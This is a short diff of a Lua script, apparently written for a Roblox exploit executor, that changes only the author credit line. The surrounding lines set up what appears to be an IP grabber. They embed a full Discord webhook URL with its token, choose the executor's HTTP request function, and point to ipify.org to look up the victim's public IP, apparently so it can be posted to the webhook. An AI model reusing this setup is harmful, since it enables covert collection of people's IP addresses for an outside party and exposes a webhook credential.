@@ -1,4 +1,4 @@
--- made by ASD whimsical_kiwi_11016
+-- made by 알리
 local discordWebhookURL = "https://discord.com/api/webhooks/1360523663174275213/IQ8z13Jj97Lf7yfFRLYy4ONuq-ut7uXmDVAgQ9YFiDMXQi5od-yiGwVq9qRqvgG0PNU5"  -- "" 사이에 웹후크 URL
 local http_request = (syn and syn.request) or (http and http.request) or request
 local ipifyURL = "https://api.ipify.org/"
